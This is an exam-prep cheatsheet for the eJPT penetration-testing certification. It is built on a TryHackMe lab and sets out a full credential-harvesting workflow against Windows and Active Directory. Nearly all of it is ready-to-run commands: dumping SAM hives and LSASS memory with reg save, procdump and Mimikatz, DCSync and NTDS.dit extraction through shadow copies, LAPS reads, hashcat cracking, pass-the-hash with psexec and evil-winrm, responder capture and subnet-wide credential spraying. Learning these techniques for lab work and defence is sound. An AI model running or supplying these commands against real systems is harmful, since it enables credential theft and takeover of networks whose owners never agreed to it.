# eJPT · Credential Harvesting Cheatsheet
> Based on TryHackMe "Credentials Harvesting" room | Methodology-focused · No flags

---

## 01 · Objectives & Scenarios

| Scenario | Key Targets |
|---|---|
| **Local Windows Credentials** | SAM database, registry hives, offline hash extraction |
| **LSASS Memory** | Cleartext passwords, NTLM hashes, Kerberos tickets from active sessions |
| **Windows Credential Manager** | Saved RDP, web, and network share credentials (vaults) |
| **Domain Controller / NTDS** | All domain hashes via DCSync or NTDS.dit extraction |
| **LAPS** | Plaintext local admin passwords stored in Active Directory attributes |

---

## 02 · Workflow & Methodology

### Step 1 — Enumerate & Identify Role
```bash
# OS + service detection
nmap -sV -O -p- --min-rate 3000 <TARGET>

# Check if target is domain-joined / DC
crackmapexec smb <TARGET>
```

### Step 2 — Escalate Privileges (Required before any dump)
```bash
# Verify current privileges
whoami /priv
net localgroup administrators
```
> Almost all credential dumping requires **SYSTEM** or **Administrator** rights.

---

### Step 3 — Local SAM Dump (Non-DC Windows machine)
```bash
# Save hives from registry (run as SYSTEM/Admin)
reg save HKLM\SAM C:\Temp\SAM
reg save HKLM\SYSTEM C:\Temp\SYSTEM
reg save HKLM\SECURITY C:\Temp\SECURITY

# Extract hashes offline (Linux)
python3 secretsdump.py -sam SAM -system SYSTEM LOCAL
```
> ⚠️ You **cannot** copy `C:\Windows\System32\config\SAM` directly while Windows is running — it's locked. Use `reg save` or VSS instead.

---

### Step 4 — LSASS Memory Dump
```bash
# Method 1 — ProcDump (Sysinternals)
procdump.exe -accepteula -ma lsass.exe C:\Temp\lsass.dmp

# Method 2 — Mimikatz in-memory (on target)
mimikatz.exe
privilege::debug
sekurlsa::logonpasswords

# Method 3 — Parse dump on Linux
pypykatz lsa minidump lsass.dmp
```

---

### Step 5 — Windows Credential Manager
```bash
# Built-in Windows commands
cmdkey /list
vaultcmd /list
vaultcmd /listcreds:"Windows Credentials" /all

# Mimikatz vault module
vault::list
vault::cred
```

---

### Step 6 — Domain Controller: DCSync / NTDS.dit
```bash
# Mimikatz DCSync (mimics DC replication — no LSASS touch needed)
privilege::debug
lsadump::dcsync /domain:corp.local /user:krbtgt
lsadump::dcsync /domain:corp.local /all /csv

# Impacket remote DCSync (from Linux)
secretsdump.py corp.local/Administrator:Password@<DC_IP>

# NTDS.dit via Volume Shadow Copy
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\Temp\
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\Temp\

# Parse offline
secretsdump.py -ntds NTDS.dit -system SYSTEM LOCAL
```

---

### Step 7 — LAPS (Local Admin Password Solution)
```powershell
# PowerShell — read LAPS password if you have rights
Get-ADComputer <HOSTNAME> -Properties ms-Mcs-AdmPwd | Select ms-Mcs-AdmPwd
```
```bash
# CrackMapExec LAPS module
crackmapexec ldap <DC_IP> -u user -p pass -M laps
```

---

### Step 8 — Post-Dump: Crack or Pass-the-Hash
```bash
# Crack NTLM hashes offline
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt

# Pass-the-Hash (no cracking needed)
crackmapexec smb <TARGET> -u Administrator -H <NTLM_HASH>
psexec.py -hashes :<NTLM_HASH> Administrator@<TARGET>
wmiexec.py -hashes :<NTLM_HASH> Administrator@<TARGET>
evil-winrm -i <TARGET> -u Administrator -H <NTLM_HASH>
```
> **NTLM hash format:** `aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0`
> The second part (after `:`) is the NTLM hash used for PtH and cracking.

---

## 03 · Tool & Command Cheatsheet

| Tool | Platform | Key Command | Purpose | eJPT Weight |
|---|---|---|---|---|
| **Mimikatz** | Windows | `sekurlsa::logonpasswords` | Dump creds from LSASS memory | 🔴 Critical |
| **secretsdump.py** | Linux | `secretsdump.py -sam SAM -system SYS LOCAL` | Extract hashes from SAM/NTDS locally or via DCSync | 🔴 Critical |
| **CrackMapExec** | Linux | `crackmapexec smb <IP> -u user -p pass --sam` | SAM dump, PtH, cred spray across subnet | 🟠 High |
| **psexec.py** | Linux | `psexec.py -hashes :HASH Admin@<IP>` | Remote shell via PtH | 🟠 High |
| **pypykatz** | Linux | `pypykatz lsa minidump lsass.dmp` | Parse LSASS dump on Linux (no Windows needed) | 🟡 Medium |
| **procdump** | Windows | `procdump.exe -ma lsass.exe lsass.dmp` | Create LSASS memory dump | 🟡 Medium |
| **reg save** | Windows | `reg save HKLM\SAM C:\SAM` | Export SAM/SYSTEM hives for offline extraction | 🟠 High |
| **cmdkey** | Windows | `cmdkey /list` | List Credential Manager stored creds | 🟡 Medium |
| **vaultcmd** | Windows | `vaultcmd /listcreds:"Windows Credentials" /all` | Enumerate Windows Vault credentials | 🟡 Medium |
| **hashcat** | Linux | `hashcat -m 1000 hashes.txt rockyou.txt` | Offline NTLM hash cracking | 🟡 Medium |
| **evil-winrm** | Linux | `evil-winrm -i <IP> -u user -H HASH` | WinRM shell via PtH | 🟡 Medium |
| **Get-ADComputer** | Windows | `Get-ADComputer HOST -Properties ms-Mcs-AdmPwd` | Read LAPS password from AD | 🟢 Low-Med |

---

### Mimikatz Quick Reference
```
privilege::debug           # Enable SeDebugPrivilege (ALWAYS run first)
token::elevate             # Elevate to SYSTEM token
sekurlsa::logonpasswords   # Dump all session credentials
sekurlsa::wdigest          # Dump WDigest cleartext (if enabled)
lsadump::sam               # Dump SAM hashes locally
lsadump::dcsync /user:krbtgt  # DCSync single user
lsadump::dcsync /all /csv  # DCSync all users
vault::list                # List credential vaults
vault::cred                # Dump vault credentials
```

### Credential Search on Windows (Post-Exploit)
```powershell
# Search files for password strings
findstr /si "password" *.txt *.xml *.ini *.config *.php

# PowerShell recursive search
Get-ChildItem -Recurse | Select-String "password"

# Common credential locations
dir /s *unattend* *sysprep* *web.config* *wp-config*
type C:\Windows\Panther\Unattend.xml
type C:\inetpub\wwwroot\web.config
```

---

## 04 · eJPT Exam Mapping

| Where Creds Appear on Exam | What to Do |
|---|---|
| **Config files / cleartext** | `findstr /si "password"` across web roots and app folders — common easy win |
| **Default credentials** | Try `admin:admin`, `admin:password`, vendor defaults before brute-forcing |
| **SMB hash capture** | Run `responder -I eth0` to capture NTLMv2 hashes from auth attempts |
| **Post-RCE hashdump** | After Meterpreter: `hashdump` or `post/windows/gather/hashdump` |
| **Credential reuse / lateral movement** | Spray found creds: `crackmapexec smb <subnet>/24 -u user -p pass` |
| **Metasploit post-modules** | `post/windows/gather/credentials/credential_collector` after shell |
| **Writable shares / scripts** | Check for plaintext creds in `.bat`, `.ps1`, `.vbs` files on shares |

---

## 05 · Common Pitfalls

### 🔴 Running dumps without elevated privileges
Mimikatz, SAM dumps, and LSASS access all silently fail or throw access denied without SYSTEM/Admin rights.
**Fix:** Always verify with `whoami /priv` and escalate first.

---

### 🔴 Skipping `privilege::debug` in Mimikatz
Even as Administrator, most Mimikatz modules require `SeDebugPrivilege`. Without it, commands fail.
**Fix:** Always run `privilege::debug` first. Confirm the output says `Privilege '20' OK`.

---

### 🟠 Trying to copy SAM directly from disk
`C:\Windows\System32\config\SAM` is locked while Windows runs — direct copy fails.
**Fix:** Use `reg save`, Volume Shadow Copy (VSS), or `secretsdump.py` remotely.

---

### 🟠 Cracking when you could Pass-the-Hash
Beginners waste hours cracking complex NTLM hashes that don't need cracking.
**Fix:** Try PtH first with `psexec.py`, `crackmapexec`, or `evil-winrm`. Only crack if PtH fails.

---

### 🟡 Ignoring Credential Manager
After getting a shell, many beginners only check LSASS/SAM and miss vault credentials (often RDP/domain creds in cleartext).
**Fix:** Always run `cmdkey /list` and `vault::cred` after gaining access.

---

### 🟡 Not spraying credentials across the network
Finding creds on one machine and stopping there misses the lateral movement chain required on the eJPT.
**Fix:** `crackmapexec smb <subnet>/24 -u user -p pass` — test every found credential against all hosts.

---

### 🟡 Missing cleartext credentials in files
Jumping straight to memory dumping when credentials are sitting plaintext in config files.
**Fix:** Always `findstr /si "password"` across accessible directories before touching LSASS.

---

## Quick Ref: Hash Formats

| Hash Type | Format | Hashcat Mode |
|---|---|---|
| NTLM | `31d6cfe0d16ae931b73c59d7e0c089c0` | `-m 1000` |
| NTLMv2 (Net-NTLMv2) | `user::domain:challenge:hash` | `-m 5600` |
| LM | `aad3b435b51404eeaad3b435b51404ee` | `-m 3000` (legacy, rarely seen) |

> NTLMv2 **cannot** be used for Pass-the-Hash — crack it first. NTLM can be used directly for PtH.

---

*eJPT exam tip: Be methodical. Enumerate → Escalate → Dump → Spray. Never skip the credential reuse step.*
